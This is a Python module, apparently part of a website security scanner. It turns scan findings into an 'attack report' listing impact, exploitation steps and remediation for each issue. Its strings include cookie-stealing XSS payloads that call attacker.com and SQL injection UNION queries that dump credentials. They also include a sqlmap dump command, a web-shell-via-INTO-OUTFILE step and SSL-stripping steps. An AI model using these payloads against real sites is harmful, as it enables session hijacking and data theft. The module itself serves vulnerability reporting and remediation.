"""
Attack Report Engine
Analyzes all scan findings and generates a detailed exploitation report
explaining how each vulnerability could be used to compromise the target.
Educational purposes only.
"""

from typing import Dict, Any, List


def generate_attack_report(scan_data: Dict[str, Any]) -> Dict[str, Any]:
    """
    Generate a comprehensive attack report based on all scan findings.
    Returns dict with individual vulnerability analyses and an overall attack narrative.
    """
    vulnerabilities: List[Dict[str, Any]] = []
    attack_chains: List[str] = []

    # ── Missing Security Headers ──
    missing_headers = scan_data.get("missing_headers", [])
    if missing_headers:
        header_attacks = {
            "Content-Security-Policy": {
                "severity": "High",
                "attack_vector": "Cross-Site Scripting (XSS) & Data Injection",
                "impact": "Without CSP, attackers can inject arbitrary scripts via XSS. "
                         "This allows session hijacking, keylogging, credential theft, "
                         "cryptocurrency mining, and full account takeover.",
                "exploitation": [
                    "1. Find an input field that reflects user input (search, comment, profile)",
                    "2. Inject <script>document.location='https://attacker.com/steal?c='+document.cookie</script>",
                    "3. Send the crafted URL to the victim",
                    "4. Victim's session cookie is stolen and sent to attacker's server",
                    "5. Attacker uses the stolen cookie to impersonate the victim",
                ],
                "remediation": "Add Content-Security-Policy header: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'",
            },
            "Strict-Transport-Security": {
                "severity": "High",
                "attack_vector": "Man-in-the-Middle (MITM) / SSL Stripping",
                "impact": "Without HSTS, attackers on the same network (WiFi) can downgrade HTTPS to HTTP "
                         "and intercept all traffic including credentials, session tokens, and sensitive data.",
                "exploitation": [
                    "1. Set up a rogue WiFi hotspot or ARP spoof the local network",
                    "2. Use sslstrip to downgrade HTTPS connections to HTTP",
                    "3. All victim's traffic flows through attacker in plaintext",
                    "4. Capture login credentials, session cookies, personal data",
                    "5. Inject malicious content into HTTP responses",
                ],
                "remediation": "Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
            },
            "X-Frame-Options": {
                "severity": "Medium",
                "attack_vector": "Clickjacking / UI Redressing",
                "impact": "The page can be embedded in a hidden iframe on a malicious site. "
                         "Users can be tricked into clicking buttons they can't see — like changing passwords, "
                         "deleting accounts, or transferring money.",
                "exploitation": [
                    "1. Create a malicious page with a transparent iframe loading the target site",
                    "2. Overlay enticing content (e.g., 'Click here to win!')",
                    "3. The victim clicks what they see, but actually clicks the hidden button on the target",
                    "4. This can trigger actions like password changes, fund transfers, or data deletion",
                ],
                "remediation": "Add X-Frame-Options: DENY or SAMEORIGIN",
            },
            "X-Content-Type-Options": {
                "severity": "Medium",
                "attack_vector": "MIME Type Sniffing Attack",
                "impact": "Browsers may interpret files as a different MIME type. An uploaded text file "
                         "could be executed as JavaScript, leading to XSS.",
                "exploitation": [
                    "1. Upload a file with JavaScript content but a .txt extension",
                    "2. Browser sniffs the content and executes it as JavaScript",
                    "3. Arbitrary script execution in the context of the target domain",
                ],
                "remediation": "Add X-Content-Type-Options: nosniff",
            },
            "X-XSS-Protection": {
                "severity": "Low",
                "attack_vector": "Reflected XSS",
                "impact": "Browser's built-in XSS filter is not activated, giving less protection "
                         "against basic reflected XSS attacks.",
                "exploitation": [
                    "1. Craft a URL with XSS payload in the query string",
                    "2. Without the XSS filter, the browser won't block the reflected script",
                ],
                "remediation": "Add X-XSS-Protection: 1; mode=block",
            },
            "Referrer-Policy": {
                "severity": "Low",
                "attack_vector": "Information Leakage via Referer Header",
                "impact": "The full URL (including sensitive query parameters like tokens, session IDs) "
                         "may be leaked to third-party sites via the Referer header.",
                "exploitation": [
                    "1. If the URL contains tokens (e.g., password reset links)",
                    "2. When user clicks an external link, the full URL is sent as Referer",
                    "3. Third-party site receives the sensitive token",
                ],
                "remediation": "Add Referrer-Policy: strict-origin-when-cross-origin",
            },
            "Permissions-Policy": {
                "severity": "Low",
                "attack_vector": "Feature Abuse",
                "impact": "Browser features like camera, microphone, geolocation, and payment APIs "
                         "are not restricted. If XSS is achieved, these features can be exploited.",
                "exploitation": [
                    "1. Exploit XSS vulnerability on the page",
                    "2. Inject script that accesses camera/microphone/geolocation",
                    "3. Silently record the user or track their location",
                ],
                "remediation": "Add Permissions-Policy: camera=(), microphone=(), geolocation=()",
            },
        }

        for header in missing_headers:
            if header in header_attacks:
                info = header_attacks[header]
                vulnerabilities.append({
                    "title": f"Missing {header} Header",
                    "category": "Missing Security Header",
                    **info,
                })
            else:
                vulnerabilities.append({
                    "title": f"Missing {header} Header",
                    "category": "Missing Security Header",
                    "severity": "Low",
                    "attack_vector": "Security Misconfiguration",
                    "impact": f"The {header} security header is not set, reducing defense-in-depth.",
                    "exploitation": [f"1. The missing {header} header weakens the overall security posture"],
                    "remediation": f"Add the {header} header with appropriate values",
                })

    # ── Open Ports ──
    open_ports = scan_data.get("open_ports", [])
    if open_ports:
        port_attacks = {
            21: ("FTP", "High", "FTP often uses plaintext credentials. Brute-force login, anonymous access, or exploit known FTP vulnerabilities."),
            22: ("SSH", "Medium", "Brute-force SSH credentials using tools like Hydra. Exploit weak passwords or outdated SSH versions."),
            23: ("Telnet", "Critical", "Telnet sends everything in plaintext. Sniff credentials on the network. Brute-force login."),
            25: ("SMTP", "Medium", "Use for email spoofing, spam relay, or enumerate valid email addresses via VRFY/EXPN commands."),
            80: ("HTTP", "Low", "Standard web port. Attack surface depends on the web application running on it."),
            110: ("POP3", "Medium", "Brute-force email credentials. Intercept plaintext email traffic."),
            135: ("MSRPC", "High", "Windows RPC is a common target for remote exploits like EternalBlue."),
            139: ("NetBIOS", "High", "Enumerate shares, user accounts, and potentially gain unauthorized access to files."),
            443: ("HTTPS", "Low", "Standard secure web port. Check SSL/TLS configuration for weaknesses."),
            445: ("SMB", "Critical", "SMB is targeted by EternalBlue, WannaCry, and NotPetya. Enumerate shares, attempt null sessions."),
            1433: ("MSSQL", "High", "Brute-force SA credentials. Attempt xp_cmdshell for OS command execution."),
            3306: ("MySQL", "High", "Brute-force credentials. Attempt UDF injection for OS command execution."),
            3389: ("RDP", "High", "Brute-force credentials. Exploit BlueKeep (CVE-2019-0708) on unpatched systems."),
            5432: ("PostgreSQL", "High", "Brute-force credentials. Use COPY command for file read/write on the server."),
            5900: ("VNC", "High", "Often has weak or no authentication. Gain full remote desktop access."),
            6379: ("Redis", "Critical", "Redis often has no authentication. Write SSH keys for remote access, or use for RCE."),
            8080: ("HTTP-Alt", "Medium", "Alternative HTTP port — often runs admin panels, proxies, or development servers."),
            27017: ("MongoDB", "Critical", "MongoDB often runs without authentication. Full database access and data exfiltration."),
        }

        for port in open_ports:
            if port in port_attacks:
                service, severity, attack = port_attacks[port]
                vulnerabilities.append({
                    "title": f"Open Port {port} ({service})",
                    "category": "Open Port",
                    "severity": severity,
                    "attack_vector": f"Network Service Exploitation — {service}",
                    "impact": attack,
                    "exploitation": [
                        f"1. Connect to port {port} using appropriate client (nmap, netcat, or service-specific tool)",
                        f"2. Enumerate service version and configuration",
                        f"3. Search for known CVEs for the detected version",
                        f"4. Attempt default/weak credentials or known exploits",
                    ],
                    "remediation": f"Close port {port} if not needed, or restrict access via firewall rules. Keep {service} updated.",
                })
            else:
                vulnerabilities.append({
                    "title": f"Open Port {port}",
                    "category": "Open Port",
                    "severity": "Medium",
                    "attack_vector": "Network Service Exposure",
                    "impact": f"Port {port} is open and accepting connections, increasing the attack surface.",
                    "exploitation": [f"1. Probe port {port} for service identification and exploit accordingly"],
                    "remediation": f"Close port {port} if not needed, or restrict with firewall rules.",
                })

    # ── SQL Injection ──
    if scan_data.get("sql_injection"):
        vulnerabilities.append({
            "title": "SQL Injection Vulnerability",
            "category": "Injection",
            "severity": "Critical",
            "attack_vector": "SQL Injection — Database Manipulation",
            "impact": "Attacker can read, modify, or delete the entire database. Extract user credentials, "
                     "personal data, financial records. Potentially escalate to OS-level command execution "
                     "via database features (xp_cmdshell, INTO OUTFILE, COPY).",
            "exploitation": [
                "1. Identify injectable parameter (URL, form field, cookie, header)",
                "2. Determine database type via error-based or blind techniques",
                "3. Use UNION SELECT to extract table names: ' UNION SELECT table_name FROM information_schema.tables --",
                "4. Extract column names: ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --",
                "5. Dump credentials: ' UNION SELECT username,password FROM users --",
                "6. Escalate: Use INTO OUTFILE to write web shell, or xp_cmdshell for OS commands",
                "7. Automated tool: sqlmap -u 'target_url?param=1' --dbs --dump",
            ],
            "remediation": "Use parameterized queries / prepared statements. Never concatenate user input into SQL. "
                          "Implement input validation and use an ORM. Apply least-privilege database accounts.",
        })
        attack_chains.append("SQL Injection → Database dump → Credential theft → Account takeover")

    # ── XSS ──
    if scan_data.get("xss"):
        vulnerabilities.append({
            "title": "Cross-Site Scripting (XSS) Vulnerability",
            "category": "Injection",
            "severity": "High",
            "attack_vector": "Reflected/Stored XSS — Client-Side Code Injection",
            "impact": "Attacker can execute arbitrary JavaScript in victims' browsers. Steal session cookies, "
                     "hijack accounts, redirect to phishing pages, deface the website, spread malware, "
                     "keylog credentials, and mine cryptocurrency.",
            "exploitation": [
                "1. Identify reflected input point (search box, URL parameter, form field)",
                "2. Inject payload: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
                "3. Craft phishing URL with the payload and send to victim",
                "4. Victim's browser executes the script, sending cookies to attacker",
                "5. For stored XSS: Post payload in comment/profile — every visitor gets attacked",
                "6. Advanced: Use BeEF framework to hook the victim's browser for persistent control",
            ],
            "remediation": "Encode all output (HTML entity encoding). Use Content-Security-Policy. "
                          "Validate and sanitize input. Use HTTPOnly flag on cookies.",
        })
        attack_chains.append("XSS → Session hijacking → Account takeover")

    # ── Exposed Directories ──
    exposed_dirs = scan_data.get("exposed_directories", [])
    if exposed_dirs:
        critical_paths = [".env", ".git", "backup", ".sql", "config", "phpmyadmin", "wp-config"]
        for d in exposed_dirs:
            severity = "Critical" if any(c in d.lower() for c in critical_paths) else "Medium"
            vulnerabilities.append({
                "title": f"Exposed Path: {d}",
                "category": "Information Disclosure",
                "severity": severity,
                "attack_vector": "Sensitive File/Directory Exposure",
                "impact": _get_dir_impact(d),
                "exploitation": [
                    f"1. Access {d} directly in the browser",
                    f"2. Download and analyze the contents for credentials, API keys, database info",
                    f"3. Use discovered information to escalate the attack",
                ],
                "remediation": f"Block public access to {d} via web server config. Remove sensitive files from web root.",
            })

    # ── SSL Issues ──
    ssl_data = scan_data.get("ssl_analysis", {})
    ssl_issues = ssl_data.get("issues", [])
    for issue in ssl_issues:
        vulnerabilities.append({
            "title": f"SSL/TLS Issue: {issue}",
            "category": "Encryption",
            "severity": "High" if "expired" in issue.lower() or "weak" in issue.lower() or "not use HTTPS" in issue else "Medium",
            "attack_vector": "Man-in-the-Middle / Traffic Interception",
            "impact": "Encrypted traffic can be intercepted or downgraded, exposing credentials and sensitive data.",
            "exploitation": [
                "1. Position on the same network as the victim (WiFi, ARP spoof)",
                "2. Intercept and downgrade/decrypt traffic",
                "3. Capture credentials, session tokens, personal data",
            ],
            "remediation": "Use TLS 1.2+ only. Renew expired certificates. Enable HSTS. Disable weak ciphers.",
        })

    # ── CORS Issues ──
    cors_data = scan_data.get("cors_analysis", {})
    cors_issues = cors_data.get("issues", [])
    for issue in cors_issues:
        severity = "Critical" if "CRITICAL" in issue else "High"
        vulnerabilities.append({
            "title": f"CORS Misconfiguration",
            "category": "Access Control",
            "severity": severity,
            "attack_vector": "Cross-Origin Data Theft",
            "impact": "Attacker's website can read authenticated API responses, stealing user data, tokens, and private information.",
            "exploitation": [
                "1. Host a malicious page with JavaScript that makes requests to the target API",
                "2. Due to the misconfigured CORS policy, the browser allows reading the response",
                "3. Victim visits the malicious page while logged into the target",
                "4. Attacker's script reads the authenticated response data (profile, settings, tokens)",
            ],
            "remediation": "Restrict Access-Control-Allow-Origin to specific trusted domains. Never use wildcard with credentials.",
            "details": issue,
        })

    # ── Cookie Issues ──
    cookie_data = scan_data.get("cookie_analysis", {})
    cookie_issues = cookie_data.get("issues", [])
    for issue in cookie_issues:
        severity = "Critical" if "CRITICAL" in issue else ("High" if "High" in issue else "Medium")
        vulnerabilities.append({
            "title": f"Cookie Security Issue",
            "category": "Session Management",
            "severity": severity,
            "attack_vector": "Session Hijacking / CSRF",
            "impact": issue,
            "exploitation": [
                "1. Exploit XSS to access cookies via document.cookie (if HttpOnly missing)",
                "2. Intercept cookies over HTTP (if Secure flag missing)",
                "3. Use CSRF to make authenticated requests (if SameSite missing)",
            ],
            "remediation": "Set HttpOnly, Secure, and SameSite=Strict flags on all session cookies.",
        })

    # ── HTTP Methods ──
    methods_data = scan_data.get("http_methods", {})
    methods_issues = methods_data.get("issues", [])
    for issue in methods_issues:
        vulnerabilities.append({
            "title": "Dangerous HTTP Method Enabled",
            "category": "Security Misconfiguration",
            "severity": "Medium",
            "attack_vector": "HTTP Method Abuse",
            "impact": issue,
            "exploitation": [
                "1. Use curl or Burp Suite to send requests with the dangerous method",
                "2. Attempt to upload (PUT), delete (DELETE), or trace (TRACE) resources",
            ],
            "remediation": "Disable unnecessary HTTP methods in web server configuration.",
        })

    # ── Open Redirects ──
    redirect_data = scan_data.get("open_redirects", {})
    redirect_vulns = redirect_data.get("vulnerable_params", [])
    if redirect_vulns:
        vulnerabilities.append({
            "title": "Open Redirect Vulnerability",
            "category": "Redirect",
            "severity": "Medium",
            "attack_vector": "Phishing / OAuth Token Theft",
            "impact": "Attacker can craft URLs that appear to be from the legitimate site but redirect to malicious pages. "
                     "Used in phishing, OAuth token theft, and bypassing URL-based security filters.",
            "exploitation": [
                f"1. Craft URL: {scan_data.get('target', '')}?{redirect_vulns[0].get('param', 'url')}=https://phishing-site.com/login",
                "2. URL appears legitimate (starts with target domain)",
                "3. Victim clicks the link, trusting the domain, but lands on the phishing page",
                "4. Can also be used to steal OAuth tokens by redirecting authorization flow",
            ],
            "remediation": "Validate redirect URLs against a whitelist. Never redirect to user-supplied URLs without validation.",
        })

    # ── Clickjacking ──
    clickjack_data = scan_data.get("clickjacking", {})
    if clickjack_data.get("vulnerable"):
        vulnerabilities.append({
            "title": "Clickjacking Vulnerability",
            "category": "UI Redressing",
            "severity": "Medium",
            "attack_vector": "Clickjacking / UI Redressing",
            "impact": "The target page can be loaded in a transparent iframe. "
                     "Users can be tricked into clicking hidden buttons — changing settings, making purchases, "
                     "deleting data, or transferring funds without their knowledge.",
            "exploitation": [
                "1. Create an HTML page with a transparent iframe loading the target",
                "2. Overlay the iframe with enticing fake content ('Click to Win!')",
                "3. When the user clicks, they actually click the hidden target button",
                "4. This triggers an action on the target site using the victim's session",
            ],
            "remediation": "Add X-Frame-Options: DENY header and CSP frame-ancestors 'none' directive.",
        })

    # ── Info Disclosure ──
    info_data = scan_data.get("info_disclosure", {})
    info_issues = info_data.get("issues", [])
    for issue in info_issues:
        severity = "High" if "stack trace" in issue.lower() or "debug" in issue.lower() else "Low"
        vulnerabilities.append({
            "title": f"Information Disclosure: {issue[:60]}",
            "category": "Information Disclosure",
            "severity": severity,
            "attack_vector": "Reconnaissance / Information Gathering",
            "impact": "Exposed information helps attackers map the technology stack, find known CVEs, "
                     "and craft targeted exploits.",
            "exploitation": [
                "1. Use discovered version info to search for known vulnerabilities (CVEs)",
                "2. Use technology info to select appropriate attack tools and payloads",
                "3. Stack traces reveal internal paths, libraries, and code structure",
            ],
            "remediation": "Remove version info from headers. Disable error details in production. Remove debug endpoints.",
        })

    # ── Tech Fingerprinting ──
    tech_data = scan_data.get("tech_fingerprint", {})
    tech_issues = tech_data.get("issues", [])
    for issue in tech_issues:
        vulnerabilities.append({
            "title": f"Technology Exposure: {issue[:60]}",
            "category": "Information Disclosure",
            "severity": "Low",
            "attack_vector": "Reconnaissance",
            "impact": "Knowing the exact technology and version allows attackers to search for known CVEs and use version-specific exploits.",
            "exploitation": [
                "1. Identify exact version of the technology",
                "2. Search CVE databases (NVD, ExploitDB) for known vulnerabilities",
                "3. Use version-specific exploit modules (e.g., Metasploit)",
            ],
            "remediation": "Remove version headers and meta tags in production.",
        })

    # ── Generate Attack Chains / Overall Narrative ──
    if scan_data.get("sql_injection") and scan_data.get("xss"):
        attack_chains.append(
            "XSS + SQLi Combo: Use XSS to steal admin session → Use admin access to find SQLi → Dump entire database"
        )

    if scan_data.get("xss") and not scan_data.get("missing_headers", []) or "Content-Security-Policy" in scan_data.get("missing_headers", []):
        attack_chains.append(
            "XSS + No CSP: Inject keylogger script → Capture all user input including passwords"
        )

    if cors_issues and scan_data.get("xss"):
        attack_chains.append(
            "XSS + CORS Misconfig: Steal tokens via XSS → Use CORS to read API data cross-origin"
        )

    if open_ports and scan_data.get("sql_injection"):
        attack_chains.append(
            "SQLi + DB Port Open: Exploit SQLi → Write web shell via INTO OUTFILE → Full server compromise"
        )

    critical_count = sum(1 for v in vulnerabilities if v["severity"] == "Critical")
    high_count = sum(1 for v in vulnerabilities if v["severity"] == "High")
    medium_count = sum(1 for v in vulnerabilities if v["severity"] == "Medium")
    low_count = sum(1 for v in vulnerabilities if v["severity"] == "Low")

    # Generate overall summary
    if critical_count > 0:
        overall = (
            f"CRITICAL RISK: This website has {critical_count} critical vulnerabilities that could lead to "
            f"complete compromise. An attacker could potentially gain full control of the database, "
            f"steal all user data, and take over the entire system. Immediate remediation is required."
        )
    elif high_count > 0:
        overall = (
            f"HIGH RISK: This website has {high_count} high-severity vulnerabilities. "
            f"An attacker could steal user sessions, intercept traffic, or gain unauthorized access. "
            f"These issues should be fixed urgently."
        )
    elif medium_count > 0:
        overall = (
            f"MODERATE RISK: This website has {medium_count} medium-severity issues. "
            f"While not immediately exploitable for full compromise, these weaken the security posture "
            f"and could be chained with other attacks."
        )
    else:
        overall = (
            "LOW RISK: No critical or high-severity vulnerabilities detected. "
            "Minor issues exist but the overall security posture is reasonable."
        )

    return {
        "vulnerabilities": vulnerabilities,
        "attack_chains": attack_chains,
        "summary": overall,
        "stats": {
            "critical": critical_count,
            "high": high_count,
            "medium": medium_count,
            "low": low_count,
            "total": len(vulnerabilities),
        },
    }


def _get_dir_impact(path: str) -> str:
    """Return specific impact description based on the exposed path."""
    impacts = {
        ".env": "Environment file may contain database credentials, API keys, secret tokens — complete compromise possible",
        ".git": "Git repository exposed — full source code download, credential history, and secrets in commit history",
        "backup": "Backup files may contain full database dumps, source code, or credentials",
        ".sql": "SQL dump file — contains database structure and potentially all data including credentials",
        "config": "Configuration file may reveal database credentials, API keys, and internal architecture",
        "phpmyadmin": "phpMyAdmin accessible — direct database management interface for attackers",
        "wp-config": "WordPress configuration — contains database credentials and authentication keys",
        "admin": "Admin panel accessible — attempt brute force or default credentials for full control",
        ".htpasswd": "Password file exposed — crack hashed passwords for server access",
        ".htaccess": "Server configuration exposed — may reveal rewrite rules, auth config, internal paths",
    }

    for key, impact in impacts.items():
        if key in path.lower():
            return impact

    return f"Exposed path {path} may leak sensitive information or provide unauthorized access"
